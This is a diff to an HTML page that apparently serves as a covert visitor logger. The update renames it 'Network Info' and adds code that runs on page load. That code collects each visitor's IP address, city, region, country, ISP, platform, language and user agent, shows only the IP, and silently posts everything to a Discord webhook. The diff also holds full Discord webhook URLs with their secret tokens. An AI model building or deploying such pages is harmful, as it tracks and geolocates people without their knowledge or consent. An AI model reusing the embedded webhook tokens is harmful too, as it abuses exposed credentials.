@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Display My IP</title>
+    <title>Network Info</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -36,38 +36,65 @@
 <body>
 
     <div class="card">
-        <h1>Your Public IP Address is:</h1>
+        <h1>Your Connection Info:</h1>
         <div id="ip-address">Loading...</div>
     </div>
 
     <script>
-        // Replace this with your actual Discord Webhook URL
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534703292934787283/hoj4Ifi-vZe91DhEa7PSaOhqeW4-rGf0sj0U46HDAZAbS8PHqebMKcVTMOUO3lq1aW3t';
+        // Replace with your actual Discord Webhook URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534708396517888150/s4GFytM4X0v1hl5-rOGVF10QhGCrGOQEHEZF7Z5vhs_sY24p9NYFQk2Isl8ODyTOUWR_';
 
-        // Fetch the IP address
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const userIp = data.ip;
-                
-                // Display IP on the screen for the visitor
-                document.getElementById('ip-address').textContent = userIp;
+        async function gatherAndSend() {
+            try {
+                // 1. Fetch IP and Geolocation data using a free API (ipapi.co)
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
 
-                // Send the IP to your Discord webhook (which pings your phone)
-                fetch(WEBHOOK_URL, {
+                const ip = data.ip || 'Unknown';
+                const city = data.city || 'Unknown';
+                const region = data.region || 'Unknown';
+                const country = data.country_name || 'Unknown';
+                const isp = data.org || 'Unknown';
+
+                // 2. Gather browser and device info
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+
+                // Display IP on the webpage
+                document.getElementById('ip-address').textContent = ip;
+
+                // 3. Construct a rich, formatted message for Discord
+                const discordPayload = {
+                    embeds: [{
+                        title: "🚨 New Visitor Logged!",
+                        color: 3447003, // Blue color embed
+                        fields: [
+                            { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
+                            { name: "🏢 ISP / Carrier", value: `\`${isp}\``, inline: false },
+                            { name: "📍 Location", value: `${city}, ${region}, ${country}`, inline: false },
+                            { name: "💻 Device / OS", value: `\`${platform}\``, inline: true },
+                            { name: "🌍 Browser Language", value: `\`${language}\``, inline: true },
+                            { name: "🔎 User Agent", value: `\`${userAgent}\``, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // 4. Send to Discord Webhook
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: `🚨 New website visitor! IP Address: ${userIp}`
-                    })
-                }).catch(err => console.error('Failed to send notification', err));
-            })
-            .catch(error => {
-                document.getElementById('ip-address').textContent = 'Unable to retrieve IP address.';
-                console.error('Error fetching IP:', error);
-            });
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordPayload)
+                });
+
+            } catch (error) {
+                document.getElementById('ip-address').textContent = 'Unable to retrieve info.';
+                console.error('Error:', error);
+            }
+        }
+
+        gatherAndSend();
     </script>
 
 </body>
